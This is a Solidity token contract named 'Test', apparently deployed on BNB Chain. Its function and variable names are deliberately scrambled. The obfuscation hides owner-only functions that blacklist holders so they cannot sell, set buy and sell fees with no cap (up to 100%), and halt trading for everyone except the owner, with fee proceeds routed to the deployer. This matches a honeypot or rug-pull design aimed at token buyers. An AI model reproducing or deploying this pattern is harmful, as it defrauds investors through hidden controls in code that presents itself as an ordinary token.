/**
 *Submitted for verification at BscScan.com on 2023-05-01
*/

/**
 *Submitted for verification at Etherscan.io on 2023-04-30
*/

/**

// SPDX-License-Identifier: MIT

*/

pragma solidity ^0.8.16;

abstract contract Context {
    function IroQgoUBzGaF() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 kdAFDNJkasjdnk) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 kdAFDNJkasjdnk) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 kdAFDNJkasjdnk
    ) external returns (bool);

    event Transfer(address indexed jnvxcmvNNZN, address indexed jbdfsjhWQWj, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

contract Ownable is Context {
    address private DvQztUxGjGDr;
    address private OjXTXDzUEuZa;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = IroQgoUBzGaF();
        DvQztUxGjGDr = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return DvQztUxGjGDr;
    }

    modifier onlyOwner() {
        require(DvQztUxGjGDr == IroQgoUBzGaF(), "");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(DvQztUxGjGDr, address(0));
        DvQztUxGjGDr = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "");
        emit OwnershipTransferred(DvQztUxGjGDr, newOwner);
        DvQztUxGjGDr = newOwner;
    }

}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address jbdfsjhWQWj,
        uint256 deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address jbdfsjhWQWj,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
}

contract Test is Context, IERC20, Ownable {

    using SafeMath for uint256;

    string private constant lGnfdGFiIASB = "Test";
    string private constant hNgVrPWhthzT = "TEST";
    uint8 private constant wlKUwPeOIuzX = 9;

    mapping(address => uint256) private ewJUMXvTnfIL;
    mapping(address => uint256) private VyRneASUBrmb;
    mapping(address => mapping(address => uint256)) private VezvzDZTbVrL;
    mapping(address => bool) private rAdSHXMWXETJ;
    uint256 private constant IKDNIAiuadhf = ~uint256(0);
    uint256 private constant lGVESqjszKMC = 21000000 * 10**9;
    uint256 private xConXihsoXXF = (IKDNIAiuadhf - (IKDNIAiuadhf % lGVESqjszKMC));
    uint256 private rPljZVIobcED;
    uint256 private tJZhppkvhsbs = 0;
    uint256 private CNIIzhMtNZEm = 0;
    uint256 private wQsjNpTAxTwn = 0;
    uint256 private nZKZpMHmcYpK = 0;

    //Original Fee
    uint256 private AccyLWRXZfKI = wQsjNpTAxTwn;
    uint256 private jaaJxdEgFyaK = nZKZpMHmcYpK;

    uint256 private CvSrINxHQyEO = AccyLWRXZfKI;
    uint256 private BQnYpCflDbRs = jaaJxdEgFyaK;

    mapping(address => bool) public AAruXSYlaDAu; mapping (address => uint256) public kEUXUxkJgNcz;
    address payable private WqGfbIVeJbjN = payable(msg.sender);
    address payable private rWEzeFbbLGIH = payable(msg.sender);

    IUniswapV2Router02 public uniswapV2Router;
    address public BNVSDNBenbw;
 
    bool private nkAgoLUjnFnO = true;
    bool private OsoiadjsvfHB = false;
    bool private eIoSkUbrQFfu = true;

    uint256 public LgovTDwcYiXx = 840000 * 10**9;
    uint256 public dPgMZGzBfBUn = 840000 * 10**9;
    uint256 public kKPViQxsVZfT = 840000 * 10**9;

    event deisuaOASIJ(uint256 LgovTDwcYiXx);
    modifier lockTheSwap {
        OsoiadjsvfHB = true;
        _;
        OsoiadjsvfHB = false;
    }

    constructor() {

        ewJUMXvTnfIL[IroQgoUBzGaF()] = xConXihsoXXF;

        IUniswapV2Router02 IyhtfxQzKUhA = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        uniswapV2Router = IyhtfxQzKUhA;
        BNVSDNBenbw = IUniswapV2Factory(IyhtfxQzKUhA.factory())
            .createPair(address(this), IyhtfxQzKUhA.WETH());

        rAdSHXMWXETJ[owner()] = true;
        rAdSHXMWXETJ[address(this)] = true;
        rAdSHXMWXETJ[WqGfbIVeJbjN] = true;
        rAdSHXMWXETJ[rWEzeFbbLGIH] = true;

        emit Transfer(address(0), IroQgoUBzGaF(), lGVESqjszKMC);
    }

    function name() public pure returns (string memory) {
        return lGnfdGFiIASB;
    }

    function symbol() public pure returns (string memory) {
        return hNgVrPWhthzT;
    }

    function decimals() public pure returns (uint8) {
        return wlKUwPeOIuzX;
    }

    function totalSupply() public pure override returns (uint256) {
        return lGVESqjszKMC;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return tokenFromReflection(ewJUMXvTnfIL[account]);
    }

    function transfer(address recipient, uint256 kdAFDNJkasjdnk)
        public
        override
        returns (bool)
    {
        PzlbVWFCSOaj(IroQgoUBzGaF(), recipient, kdAFDNJkasjdnk);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return VezvzDZTbVrL[owner][spender];
    }

    function approve(address spender, uint256 kdAFDNJkasjdnk)
        public
        override
        returns (bool)
    {
        AlYEYLDiuuFa(IroQgoUBzGaF(), spender, kdAFDNJkasjdnk);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 kdAFDNJkasjdnk
    ) public override returns (bool) {
        PzlbVWFCSOaj(sender, recipient, kdAFDNJkasjdnk);
        AlYEYLDiuuFa(
            sender,
            IroQgoUBzGaF(),
            VezvzDZTbVrL[sender][IroQgoUBzGaF()].sub(
                kdAFDNJkasjdnk,
                ""
            )
        );
        return true;
    }

    function tokenFromReflection(uint256 rAmount)
        private
        view
        returns (uint256)
    {
        require(
            rAmount <= xConXihsoXXF,
            ""
        );
        uint256 currentRate = XSYIojOFSJyB();
        return rAmount.div(currentRate);
    }

    function removeAllFee() private {
        if (AccyLWRXZfKI == 0 && jaaJxdEgFyaK == 0) return;

        CvSrINxHQyEO = AccyLWRXZfKI;
        BQnYpCflDbRs = jaaJxdEgFyaK;

        AccyLWRXZfKI = 0;
        jaaJxdEgFyaK = 0;
    }

    function restoreAllFee() private {
        AccyLWRXZfKI = CvSrINxHQyEO;
        jaaJxdEgFyaK = BQnYpCflDbRs;
    }

    function AlYEYLDiuuFa(
        address owner,
        address spender,
        uint256 kdAFDNJkasjdnk
    ) private {
        require(owner != address(0), "");
        require(spender != address(0), "");
        VezvzDZTbVrL[owner][spender] = kdAFDNJkasjdnk;
        emit Approval(owner, spender, kdAFDNJkasjdnk);
    }

    function PzlbVWFCSOaj(
        address jnvxcmvNNZN,
        address jbdfsjhWQWj,
        uint256 kdAFDNJkasjdnk
    ) private {
        require(jnvxcmvNNZN != address(0), "");
        require(jbdfsjhWQWj != address(0), "");
        require(kdAFDNJkasjdnk > 0, "");

        if (jnvxcmvNNZN != owner() && jbdfsjhWQWj != owner()) {

            //Trade start check
            if (!nkAgoLUjnFnO) {
                require(jnvxcmvNNZN == owner(), "");
            }

            require(kdAFDNJkasjdnk <= LgovTDwcYiXx, "");
            require(!AAruXSYlaDAu[jnvxcmvNNZN] && !AAruXSYlaDAu[jbdfsjhWQWj], "");

            if(jbdfsjhWQWj != BNVSDNBenbw) {
                require(balanceOf(jbdfsjhWQWj) + kdAFDNJkasjdnk < dPgMZGzBfBUn, "");
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            bool GPCBhcCXDJxv = contractTokenBalance >= kKPViQxsVZfT;

            if(contractTokenBalance >= LgovTDwcYiXx)
            {
                contractTokenBalance = LgovTDwcYiXx;
            }

            if (GPCBhcCXDJxv && !OsoiadjsvfHB && jnvxcmvNNZN != BNVSDNBenbw && eIoSkUbrQFfu && !rAdSHXMWXETJ[jnvxcmvNNZN] && !rAdSHXMWXETJ[jbdfsjhWQWj]) {
                swapTokensForEth(contractTokenBalance);
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance > 0) {
                    sendETHToFee(address(this).balance);
                }
            }
        }

        bool JYjivJfkmdHC = true;

        if ((rAdSHXMWXETJ[jnvxcmvNNZN] || rAdSHXMWXETJ[jbdfsjhWQWj]) || (jnvxcmvNNZN != BNVSDNBenbw && jbdfsjhWQWj != BNVSDNBenbw)) {
            JYjivJfkmdHC = false;
        } else {

            if(jnvxcmvNNZN == BNVSDNBenbw && jbdfsjhWQWj != address(uniswapV2Router)) {
                AccyLWRXZfKI = tJZhppkvhsbs;
                jaaJxdEgFyaK = CNIIzhMtNZEm;
            }

            if (jbdfsjhWQWj == BNVSDNBenbw && jnvxcmvNNZN != address(uniswapV2Router)) {
                AccyLWRXZfKI = wQsjNpTAxTwn;
                jaaJxdEgFyaK = nZKZpMHmcYpK;
            }

        }

        MtEwLcyBectl(jnvxcmvNNZN, jbdfsjhWQWj, kdAFDNJkasjdnk, JYjivJfkmdHC);
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        AlYEYLDiuuFa(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function sendETHToFee(uint256 kdAFDNJkasjdnk) private {
        rWEzeFbbLGIH.transfer(kdAFDNJkasjdnk);
    }

    function MPbsLtqTNnit(bool emVcXGbkNONN) public onlyOwner {
        nkAgoLUjnFnO = emVcXGbkNONN;
    }

    function manualswap() external {
        require(IroQgoUBzGaF() == WqGfbIVeJbjN || IroQgoUBzGaF() == rWEzeFbbLGIH);
        uint256 contractBalance = balanceOf(address(this));
        swapTokensForEth(contractBalance);
    }

    function manualsend() external {
        require(IroQgoUBzGaF() == WqGfbIVeJbjN || IroQgoUBzGaF() == rWEzeFbbLGIH);
        uint256 contractETHBalance = address(this).balance;
        sendETHToFee(contractETHBalance);
    }

    function dijsoAAruXSYlaDAu(address[] memory AAruXSYlaDAu_) public onlyOwner {
        for (uint256 i = 0; i < AAruXSYlaDAu_.length; i++) {
            AAruXSYlaDAu[AAruXSYlaDAu_[i]] = true;
        }
    }

    function XguoqjzstVLB(address AFJsodajni) public onlyOwner {
        AAruXSYlaDAu[AFJsodajni] = false;
    }

    function MtEwLcyBectl(
        address sender,
        address recipient,
        uint256 kdAFDNJkasjdnk,
        bool JYjivJfkmdHC
    ) private {
        if (!JYjivJfkmdHC) removeAllFee();
        PzlbVWFCSOajStandard(sender, recipient, kdAFDNJkasjdnk);
        if (!JYjivJfkmdHC) restoreAllFee();
    }

    function PzlbVWFCSOajStandard(
        address sender,
        address recipient,
        uint256 tAmount
    ) private {
        (
            uint256 rAmount,
            uint256 rTransferAmount,
            uint256 rFee,
            uint256 tTransferAmount,
            uint256 tFee,
            uint256 tTeam
        ) = BHxSKDJCaXob(tAmount);
        ewJUMXvTnfIL[sender] = ewJUMXvTnfIL[sender].sub(rAmount);
        ewJUMXvTnfIL[recipient] = ewJUMXvTnfIL[recipient].add(rTransferAmount);
        GzxChTrRZRSe(tTeam);
        dHvFqiBKbIYs(rFee, tFee);
        emit Transfer(sender, recipient, tTransferAmount);
    }

    function GzxChTrRZRSe(uint256 tTeam) private {
        uint256 currentRate = XSYIojOFSJyB();
        uint256 rTeam = tTeam.mul(currentRate);
        ewJUMXvTnfIL[address(this)] = ewJUMXvTnfIL[address(this)].add(rTeam);
    }

    function dHvFqiBKbIYs(uint256 rFee, uint256 tFee) private {
        xConXihsoXXF = xConXihsoXXF.sub(rFee);
        rPljZVIobcED = rPljZVIobcED.add(tFee);
    }

    receive() external payable {}

    function BHxSKDJCaXob(uint256 tAmount)
        private
        view
        returns (
            uint256,
            uint256,
            uint256,
            uint256,
            uint256,
            uint256
        )
    {
        (uint256 tTransferAmount, uint256 tFee, uint256 tTeam) =
            NwlxzWXAIoTO(tAmount, AccyLWRXZfKI, jaaJxdEgFyaK);
        uint256 currentRate = XSYIojOFSJyB();
        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee) =
            cbijayVumqTh(tAmount, tFee, tTeam, currentRate);
        return (rAmount, rTransferAmount, rFee, tTransferAmount, tFee, tTeam);
    }

    function NwlxzWXAIoTO(
        uint256 tAmount,
        uint256 redisFee,
        uint256 taxFee
    )
        private
        pure
        returns (
            uint256,
            uint256,
            uint256
        )
    {
        uint256 tFee = tAmount.mul(redisFee).div(100);
        uint256 tTeam = tAmount.mul(taxFee).div(100);
        uint256 tTransferAmount = tAmount.sub(tFee).sub(tTeam);
        return (tTransferAmount, tFee, tTeam);
    }

    function cbijayVumqTh(
        uint256 tAmount,
        uint256 tFee,
        uint256 tTeam,
        uint256 currentRate
    )
        private
        pure
        returns (
            uint256,
            uint256,
            uint256
        )
    {
        uint256 rAmount = tAmount.mul(currentRate);
        uint256 rFee = tFee.mul(currentRate);
        uint256 rTeam = tTeam.mul(currentRate);
        uint256 rTransferAmount = rAmount.sub(rFee).sub(rTeam);
        return (rAmount, rTransferAmount, rFee);
    }

    function XSYIojOFSJyB() private view returns (uint256) {
        (uint256 rSupply, uint256 tSupply) = aTzdZpSZveva();
        return rSupply.div(tSupply);
    }

    function aTzdZpSZveva() private view returns (uint256, uint256) {
        uint256 rSupply = xConXihsoXXF;
        uint256 tSupply = lGVESqjszKMC;
        if (rSupply < xConXihsoXXF.div(lGVESqjszKMC)) return (xConXihsoXXF, lGVESqjszKMC);
        return (rSupply, tSupply);
    }

    function qGcJkOyDmBGG(uint256 redisFeeOnBuy, uint256 redisFeeOnSell, uint256 taxFeeOnBuy, uint256 taxFeeOnSell) public onlyOwner {
        tJZhppkvhsbs = redisFeeOnBuy;
        wQsjNpTAxTwn = redisFeeOnSell;
        CNIIzhMtNZEm = taxFeeOnBuy;
        nZKZpMHmcYpK = taxFeeOnSell;
    }

    //Set minimum tokens required jbdfsjhWQWj swap.
    function IunvlLxHDCms(uint256 swapTokensAtAmount) public onlyOwner {
        kKPViQxsVZfT = swapTokensAtAmount;
    }

    function BKJDCVhbnXAJ(bool OBhhtDAwIeTF) public onlyOwner {
        eIoSkUbrQFfu = OBhhtDAwIeTF;
    }

    function avIrzzkGplPx(uint256 HMGVZAzxzDKk) public onlyOwner {
        LgovTDwcYiXx = HMGVZAzxzDKk;
    }

    function FdwolmpVRrHG(uint256 HUHnJFtXozCt) public onlyOwner {
        dPgMZGzBfBUn = HUHnJFtXozCt;
    }

    function sdfhVFSUDHB(address[] calldata Fjnsdsdfsjkn, bool DFNKJADSAlk) public onlyOwner {
        for(uint256 k = 0; k < Fjnsdsdfsjkn.length; k++) {
            rAdSHXMWXETJ[Fjnsdsdfsjkn[k]] = DFNKJADSAlk;
        }
    }

}